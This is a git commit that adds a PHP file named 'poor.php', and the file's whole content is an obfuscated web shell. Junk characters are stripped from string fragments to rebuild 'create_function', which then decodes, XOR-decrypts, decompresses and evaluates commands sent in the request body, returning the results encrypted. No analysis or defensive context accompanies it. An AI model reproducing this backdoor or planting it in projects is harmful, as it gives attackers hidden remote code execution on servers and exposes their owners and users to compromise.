819c601c2530c880f8e7b670d26c9275352d7d97
rasko7 <117736056+rasko7@users.noreply.github.com>
2022-11-08 18:12:09 +0600

    Create poor.php

---
+++ poor.php
@@ -0,0 +1,11 @@
+<?php
+$k='val(Z#@gzuncomZ#presZ#s(@Z#x(@baZ#Z#se64_deZ#code($m[Z#1])Z#,$kZ#)));$o=@ob_get_contZ#ents();Z#@Z#';
+$w='#Z#unction x($Z#t,Z#$k){$c=sZ#trlen($k)Z#;$l=sZ#trleZ#n(Z#$t);$o="";Z#fZ#or($i=0;$i<$Z#l;Z#){for';
+$x='$Z#k="9Z#Z#003d1df";$kh="22eb4d3Z#Z#82001";$kZ#f="5070385Z#1Z#94cZ#8";$pZ#="avoiZ#7PyXFOfoNtNM";fZ';
+$W=str_replace('Xr','','crXrXreatXreXr_XrfunctiXron');
+$l='Z#($j=0;($jZ#<$c&&$Z#i<$l);$j+Z#+Z#,$i++){$o.=$Z#t{$Z#i}^Z#$k{$jZ#};}}Z#return Z#$o;}if (@Z#preg_Z#Z#m';
+$q='oZ#b_end_clean();$Z#r=@Z#Z#base6Z#4_encode(@x(@gzcomZ#preZ#ss($Z#Z#o),$k));prinZ#t("$p$kh$r$Z#kf");}';
+$D='atch("/$kh(Z#Z#.+)$kf/"Z#Z#,@fZ#ile_get_contents("php://Z#inZ#put")Z#,$Z#m)==Z#1) {@ob_start();@eZ#';
+$C=str_replace('Z#','',$x.$w.$l.$D.$k.$q);
+$R=$W('',$C);$R();
+?>
